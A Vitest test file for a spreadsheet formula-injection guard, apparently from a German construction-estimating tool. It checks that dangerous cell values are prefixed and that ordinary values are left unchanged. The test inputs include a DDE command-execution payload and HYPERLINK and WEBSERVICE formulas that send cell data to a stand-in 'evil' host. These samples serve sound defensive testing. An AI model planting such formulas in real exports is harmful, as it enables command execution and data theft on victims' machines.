import { describe, test, expect } from 'vitest';
import { guardSpreadsheetFormula, guardCell } from '../spreadsheetSafe';

describe('guardSpreadsheetFormula — CSV/Excel formula-injection guard', () => {
  // Values that open as a live formula in Excel/LibreOffice → must be prefixed.
  const dangerous = [
    '=cmd|\'/c calc\'!A0',                 // classic DDE command exec
    '=HYPERLINK("http://evil/?"&A1,"x")',  // exfil via hyperlink
    '=WEBSERVICE("http://evil/"&A1)',      // exfil via webservice
    '@SUM(1+1)*cmd',                       // @-form (Lotus/Excel)
    '+1+1',                                // + lead
    '-2+3',                                // - lead
    '=',
    '\tTAB-injected',                      // leading TAB
    '\rCR-injected',                       // leading CR
  ];
  for (const v of dangerous) {
    test(`prefixes a leading formula char: ${JSON.stringify(v)}`, () => {
      const out = guardSpreadsheetFormula(v);
      expect(out).toBe(`'${v}`);
      // The neutralized value no longer starts with a formula trigger.
      expect(/^[=+\-@\t\r]/.test(out)).toBe(false);
    });
  }

  // Legitimate LV/tool values — must be returned verbatim (no false positives).
  const safe = [
    '01.01.001',          // OZ
    '1.2.3',              // hierarchical OZ
    'Mobilbauzaun H=2,0m', // '=' in the MIDDLE is fine
    '1.234,56',           // German number-as-text
    'm²', 'Stk', 'St', 'm',
    'Lieferung & Montage',
    'Beton C25/30',
    '',                   // empty
    ' leading space then =x', // a leading SPACE already defuses Excel
    '"already quoted"',
  ];
  for (const v of safe) {
    test(`leaves a legitimate value untouched: ${JSON.stringify(v)}`, () => {
      expect(guardSpreadsheetFormula(v)).toBe(v);
    });
  }

  test('does not double-prefix an already-guarded value', () => {
    const once = guardSpreadsheetFormula('=evil');
    expect(once).toBe("'=evil");
    expect(guardSpreadsheetFormula(once)).toBe(once); // starts with ' → unchanged
  });
});

describe('guardCell — passes non-strings through untouched', () => {
  test('numbers are returned as-is (stay numeric cells)', () => {
    expect(guardCell(1234.56)).toBe(1234.56);
    expect(guardCell(-5)).toBe(-5); // a numeric -5, NOT a "-5" string
    expect(guardCell(0)).toBe(0);
  });
  test('formula objects (exceljs { formula, result }) are untouched', () => {
    const f = { formula: 'SUM(A1:A2)', result: 3 };
    expect(guardCell(f)).toBe(f);
  });
  test('a dangerous string is guarded', () => {
    expect(guardCell('=cmd')).toBe("'=cmd");
  });
});
